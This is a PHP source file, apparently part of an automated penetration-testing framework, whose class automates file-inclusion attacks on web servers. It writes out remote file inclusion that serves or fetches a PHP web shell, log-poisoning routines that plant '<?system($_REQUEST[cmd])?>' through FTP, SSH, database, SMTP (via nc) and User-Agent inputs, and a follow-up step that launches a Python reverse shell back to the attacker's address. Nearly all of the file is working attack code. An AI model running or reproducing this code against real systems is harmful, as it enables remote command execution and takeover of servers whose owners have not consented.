<?php

class FI extends CE{



    // curl -d Name="Lee" -d Age="36" -d Town="The Internet" https://example.com/form-data.php
    //$this->cmd("test", "wget --timeout=2 --tries=2 --post-data 'Name=Lee&Age=36&Town=The%20Internet' https://example.com/page-two.php");
    
/*
 A few of the more interesting proc entries include:
Directory 	Description
/proc/sched_debug 	This is usually enabled on newer systems, such as RHEL 6.  It provides information as to what process is running on which cpu.  This can be handy to get a list of processes and their PID number.
/proc/mounts 	Provides a list of mounted file systems.  Can be used to determine where other interesting files might be located
/proc/net/arp 	Shows the ARP table.  This is one way to find out IP addresses for other internal servers.
/proc/net/route 	Shows the routing table information.
/proc/net/tcp and /proc/net/udp 	Provides a list of active connections.  Can be used to determine what ports are listening on the server
/proc/net/fib_trie 	This is used for route caching.  This can also be used to determine local IPs, as well as gain a better understanding of the target’s networking structure
/proc/version 	Shows the kernel version.  This can be used to help determine the OS running and the last time it’s been fully updated.
 */
	
    public function __construct($stream,$url,$param,$value,$methode_http) {
        parent::__construct($stream,$url,$param,$value,$methode_http);

	}
	

	
	
	

	

	public function fi2log4webserver($cmd,$filter){ // OK msf 
	$this->titre(__FUNCTION__);
	
	$this->ssTitre("Make Error log ");

	
	$uri_4 = "<?system(\$_REQUEST[cmd])?>";
	$uri_encoded = rawurlencode($uri_4);
	$this->url2check($this->user2agent,"$this->http_type://$this->vhost:$this->port/$uri_encoded"," > /dev/null");
	$this->ssTitre("find error.log path");
	$uri_2 = str_replace("$this->param=$this->value", "$this->param=/etc/apache2/sites-available/default", $this->url);
	if ($this->url2check($this->user2agent,"$uri_2", "| grep ErrorLog")) {
		$this->note("log path found");
		$log_path = trim($this->req_ret_str("wget --no-check-certificate --timeout=2 --tries=2 -qO- '$uri_2' | grep ErrorLog | cut -d' ' -f2 "));
		$this->article("Log error path", $log_path);
		$this->param2fi($this->user2agent,$log_path, $cmd, $filter);
			
	}
	else {
		$this->ssTitre("Looking for log File - WebServer");
		//if (!$this->ip4priv($this->ip)) $this->requette("firefox -search \"site:$this->vhost inurl:\\\"error.log\\\" intext:2014 ext:log\" ");			
		$tab_log_webserver = file("$this->dir_tools/dico/fi_linux_log_webserver.dico");
		//$tab_log_webserver = array("/var/www/log/error.log");
		foreach ($tab_log_webserver as $path_log){
			$path_log = trim($path_log);
			if (!empty($path_log)) $this->param2fi($this->user2agent,$path_log, $cmd, $filter);
		}
	
	}
}









public function lfi2template($path,$filter) {
    $this->ssTitre(__FUNCTION__);
    $this->article("PATH", $path);
    $value1_encoded = $this->url2encode($path);
    $value2_encoded = $this->url2encode("$path.$this->null_byte");
    $value3_encoded = $this->url2encode("$this->dir_remote.$path");
    $value4_encoded = $this->url2encode("$this->dir_remote.$path.$this->null_byte");
    
    
    $uri_1 = str_replace("$this->param=$this->value", "$this->param=$value1_encoded", $this->url);
    $uri_2 = str_replace("$this->param=$this->value", "$this->param=$value2_encoded", $this->url);
    $uri_3 = str_replace("$this->param=$this->value", "$this->param=$value3_encoded", $this->url);
    $uri_4 = str_replace("$this->param=$this->value", "$this->param=$value4_encoded", $this->url);
    
    
    if ($this->url2check($this->user2agent,"$uri_1",$filter)) {
        $uri = str_replace("$this->param=$this->value", "$this->param=%FILE%", $this->url);
        return $uri;
    }
    if ($this->url2check($this->user2agent,"$uri_2",$filter)) {
        $uri = str_replace("$this->param=$this->value", "$this->param=%FILE%%NB%", $this->url);
        return $uri;
    }
    if ($this->url2check($this->user2agent,"$uri_3",$filter)) {
        $uri = str_replace("$this->param=$this->value", "$this->param=%RMT%%FILE%", $this->url);
        return $uri;
    }
    if ($this->url2check($this->user2agent,"$uri_4",$filter)) {
        $uri = str_replace("$this->param=$this->value", "$this->param=%RMT%%FILE%%NB%", $this->url);
        return $uri;
    }
    return "";
}







public function fi2rfi($cmd,$filter){
	$this->gtitre(__FUNCTION__);
	// for PHP and LINUX only 
	// https://github.com/tennc/webshell
    $attacker_ip = $this->ip4addr4target($this->ip);

    if($this->ip4priv($this->ip)) {
	    $this->requette("echo \"<?php system(\\\$_REQUEST[\\\"cmd\\\"]);?>\" | tee $this->dir_tmp/rohff.txt " );
	    $this->tcp2open4server($attacker_ip,$this->port_rfi);
	    $php_backdoor_path = "http://$attacker_ip:$this->port_rfi/rohff.txt";
	}
	// https://raw.githubusercontent.com/JohnTroony/php-webshells/master/simple-backdoor.php
	// https://raw.githubusercontent.com/tennc/webshell/master/web-malware-collection-13-06-2012/PHP/c99.txt
	// https://gist.githubusercontent.com/joswr1ght/22f40787de19d80d110b37fb79ac3985/raw/be4b2c021b284f21418f55b9d4496cdd3b3c86d8/easy-simple-php-webshell.php
	// https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/php/simple-backdoor.php
	else  $php_backdoor_path = "https://raw.githubusercontent.com/JohnTroony/php-webshells/master/simple-backdoor.php";
	
	$this->ssTitre("Sending PHP CODE VIA RFI");
	$this->param2fi($this->user2agent,$php_backdoor_path,$cmd,$filter);
	}
	
	

	public function fi2info4file($template,$cmd_exec,$filter){
	    // $result .= strip_tags($this->compare2string($tmp,$this->html_original)); // INFO
    $this->ssTitre(__FUNCTION__);
    $chemins = file("$this->dir_tools/dico/fi_linux_info.dico");
    $this->article("TEMPLATE", $template);
    foreach ($chemins as $chemin){
        $chemin = trim($chemin);
        $path = str_replace("%RMT%", $this->dir_remote, $template);
        $path = str_replace("%NB%", $this->null_byte, $path);
        $path = str_replace("%FILE%", $chemin, $path);
        $this->article("CHECK", $path);
        

        $cmd_value = $this->param2url($template, $cmd_exec);      
        if (!empty($this->param2check($this->user2agent,$cmd_value,$filter))) {
            
            $attacker_port = rand(1024,65535);
            $attacker_ip = $this->ip4addr4target($this->ip);
            $shell = "/bin/sh";
            $cmd_rev_nc = $this->rev8python($attacker_ip, $attacker_port, $shell);
            $this->service4lan($template, $cmd_rev_nc, $attacker_port, $filter);
        }
        $this->pause();
        
        }
}

public function fi2lfi($cmd,$filter){
    $this->fi2log_poisoning($cmd,$filter);
}

public function fi2log_poisoning($cmd,$filter){
    $this->gtitre(__FUNCTION__);
    // for PHP and LINUX only
    $this->ip2port();
    $this->fi2log4db($cmd,$filter);$this->pause(); // OK
    $this->fi2log4fd($cmd,$filter);$this->pause();
    $this->fi2log4ftp($cmd,$filter);$this->pause(); // OK
    //$this->fi2log4ssession($cmd,$filter);$this->pause();
    $this->fi2log4smtp($cmd,$filter);$this->pause(); // OK
    $this->fi2log4ssh($cmd,$filter);$this->pause(); // OK
    //$this->fi2log4telnet($cmd,$filter);$this->pause();
    $this->fi2log4useragent($cmd,$filter);$this->pause(); // OK
    $this->fi2log4webserver($cmd,$filter);$this->pause(); // OK msf

}


public function fi4pentest($OS){
    $this->titre(__FUNCTION__);
    $OS = trim($OS);
    $sql_r_1 = "SELECT param2fi FROM URI WHERE $this->uri2where AND param2fi <> 0";
    if ($this->checkBD($sql_r_1) ) return  $this->article("File Inclusion","DONE");
    else {
        
     switch ($OS){
        case "linux" :
            $cmd = "id";
            $filter = "| grep 'uid=' | grep 'gid=' ";
            $this->fi2rfi($cmd,$filter);$this->pause(); // OK 
            $this->fi2lfi($cmd,$filter);$this->pause();
            break;
            
            
            
        case "windows" :
            break;
            
            
    }
    
    //return $this->req2BD4in("param2fi","URI",$this->uri2where,"1");
    }

}

public function fi2log4ftp($cmd,$filter) {
    $this->titre(__FUNCTION__);
    $ports_ftp = $this->ip2ports4service("ftp");
    foreach ($ports_ftp as $port_ftp)
    if (!empty($port_ftp)){
        $user2name = "<?system(\$_REQUEST[cmd])?>";
        $user2pass = "";
        
        $this->auth2login_ftp($port_ftp,$user2name, $user2pass);
        $tab_log = file("$this->dir_tools/dico/fi_linux_log_ftp.dico");
        foreach ($tab_log as $path_log){
            $path_log = trim($path_log);
            if (!empty($path_log)) $this->param2fi($this->user2agent,$path_log, $cmd, $filter);
        }
    }
}

public function fi2log4session($cmd,$filter) {
    $this->titre(__FUNCTION__);


        $id_session = $this->url2cookies($this->url);
        
        if (!empty($this->url2form($this->url))){
        $tab_log = file("$this->dir_tools/dico/fi_linux_log_sessions.dico");
        $tab_log = array("/var/lib/php5/sess_$id_session");
        foreach ($tab_log as $path_log){
            $path_log = trim($path_log);
            if (!empty($path_log)) {
                $path_log = str_replace("%ID_SESSION%", $id_session, $path_log);
                $this->param2fi($this->user2agent,$path_log, $cmd, $filter);
            }
        }
        }
}

public function fi2log4useragent($cmd,$filter) {
    $this->titre(__FUNCTION__);
        $user2agent = "<?system(\\\$_REQUEST[cmd])?>";
        //$user2agent = $this->url2encode($user2agent);
        $path_log = "/proc/self/environ";
        $this->param2fi($user2agent,$path_log, $cmd, $filter);
}

public function fi2log4fd($cmd,$filter) {
    $this->titre(__FUNCTION__);
    
    /*
    Similarly /proc/self/fd/<id> (or it’s symlink: /dev/fd) can be used in combination with the HTTP Referer field to inject the payload into opened error-logs by apache2. 
    Although it’s needed to brute-force these ids first to determine currently active file-descriptors referring to the opened file.
   
   Include http://example.com/index.php?page=/proc/$PID/fd/$FD
with $PID = PID of the process (can be bruteforced) and $FD the filedescriptor (can be bruteforced too)
  /proc/sched_debug # Can be used to see what processes the machine is running
   
   and what caught my attention here was “referer” header because I knew that it was something which is under user controlled input. Time to execute some command. I added ‘referer’ header in the HTTP request , set its value to system(id) and forwarded it
   
   $path_log = "/dev/fd/$i";
      */
    $uri_4 = "<?system(\$_REQUEST[cmd])?>";
    $uri_encoded = rawurlencode($uri_4);
    $this->url2check($this->user2agent,"$this->http_type://$this->vhost:$this->port/$uri_encoded"," > /dev/null");
    
    $user2agent = "<?system(\\\$_REQUEST[cmd])?>";
    //$user2agent = "";
    
    $tab_log = file("$this->dir_tools/dico/fi_linux_log_fd.dico");
    foreach ($tab_log as $path_log){
        $path_log = trim($path_log);
        if (!empty($path_log)) $this->param2fi($user2agent,$path_log, $cmd, $filter);
    }

    
}

public function fi2log4telnet($cmd,$filter) {
    $this->titre(__FUNCTION__);
    $ports_telnet = $this->ip2ports4service("telnet");
    foreach ($ports_telnet as $port_telnet)
        if (!empty($port_telnet)){
        $user2name = "<?system(\$_REQUEST[cmd])?>";
        $user2pass = "";
        //$this->auth2login_telnet($user2name,$user2pass);
        $tab_log = file("$this->dir_tools/dico/fi_linux_log_db.dico");
        //$tab_log = array("/var/log/auth.log");
        foreach ($tab_log as $path_log){
            $path_log = trim($path_log);
            if (!empty($path_log)) $this->param2fi($this->user2agent,$path_log, $cmd, $filter);
        }
    }
}

public function fi2log4db($cmd,$filter) {
    $this->titre(__FUNCTION__);
    $this->fi2log4db4mysql($cmd, $filter);$this->pause();
    $this->fi2log4db4mongodb($cmd, $filter);$this->pause();
    $this->fi2log4db4postgresql($cmd, $filter);$this->pause();
}

public function fi2log4db4mysql($cmd,$filter) {
    $this->titre(__FUNCTION__);
    $user2name = "<?system(\$_REQUEST[cmd])?>";
    $user2pass = "";
    
    $tab_log = file("$this->dir_tools/dico/fi_linux_log_db_mysql.dico");
    
    $ports_mysql = $this->ip2ports4service("mysql");
    foreach ($ports_mysql as $port_mysql)
    if (!empty($port_mysql)){
        $this->auth2login_mysql($port_mysql,$user2name,$user2pass);
        foreach ($tab_log as $path_log){
            $path_log = trim($path_log);
            if (!empty($path_log)) $this->param2fi($this->user2agent,$path_log, $cmd, $filter);
        }
    }
}


public function fi2log4db4mongodb($cmd,$filter) {
    $this->titre(__FUNCTION__);
    $user2name = "<?system(\$_REQUEST[cmd])?>";
    $user2pass = "";
    
    $tab_log = file("$this->dir_tools/dico/fi_linux_log_db_mongodb.dico");
    
    $ports_mongodb = $this->ip2ports4service("mongodb");
    foreach ($ports_mongodb as $port_mongodb)
    if (!empty($port_mongodb)){
        $this->auth2login_mongodb($port_mongodb,$user2name,$user2pass);
        foreach ($tab_log as $path_log){
            $path_log = trim($path_log);
            if (!empty($path_log)) $this->param2fi($this->user2agent,$path_log, $cmd, $filter);
        }
    }
}


public function fi2log4db4postgresql($cmd,$filter) {
    $this->titre(__FUNCTION__);
    $user2name = "<?system(\$_REQUEST[cmd])?>";
    $user2pass = "";
    
    $tab_log = file("$this->dir_tools/dico/fi_linux_log_db_postgresql.dico");
    
    $ports_postgresql = $this->ip2ports4service("postgresql");
    foreach ($ports_postgresql as $port_postgresql)
    if (!empty($port_postgresql)){
        $this->auth2login_pgsql($port_postgresql,$user2name,$user2pass);
        foreach ($tab_log as $path_log){
            $path_log = trim($path_log);
            if (!empty($path_log)) $this->param2fi($this->user2agent,$path_log, $cmd, $filter);
        }
    }
}


public function fi2log4ssh($cmd,$filter) {
    $this->titre(__FUNCTION__);
    $ports_ssh = $this->ip2ports4service("ssh");
    foreach ($ports_ssh as $port_ssh)
    if (!empty($port_ssh)){
    $user2name = "<?system(\$_REQUEST[cmd])?>";
    $user2pass = "";   
    
    $command = "";
    
    $this->auth2login_ssh($port_ssh,$user2name, $user2pass);   
    //$this->ssh($this->ip, $port_ssh,$user2name, $user2pass,$command); 
    $tab_log = file("$this->dir_tools/dico/fi_linux_log_ssh.dico");
    //$tab_log = array("/var/log/auth.log");
    foreach ($tab_log as $path_log){
        $path_log = trim($path_log);
        if (!empty($path_log)) $this->param2fi($this->user2agent,$path_log, $cmd, $filter);
    }
    }
}





public function fi2log4smtp($cmd,$filter) {
    $this->titre(__FUNCTION__);
    $ports_smtp = $this->ip2ports4sservice("smtp");
    foreach ($ports_smtp as $port_smtp)
    if (!empty($port_smtp)){
        $data = "<?system(\$_REQUEST[cmd])?>";
       
        $smtp =<<<CODE
HELO localhost
MAIL FROM: $this->user2email
RCPT TO: $this->user2email
DATA
Subject: Pentest on this server By $data
test $this->ip 

$this->user2agent

\n
\n
.
QUIT
CODE;


        $query = "echo '$smtp' | nc $this->ip $port_smtp -n -q 3";
        $this->requette($query);$this->pause();

        $tab_log = file("$this->dir_tools/dico/fi_linux_log_smtp.dico");

        foreach ($tab_log as $path_log){
            $path_log = trim($path_log);
            if (!empty($path_log)) $this->param2fi($this->user2agent,$path_log, $cmd, $filter);
        }
    }
}







}
?>
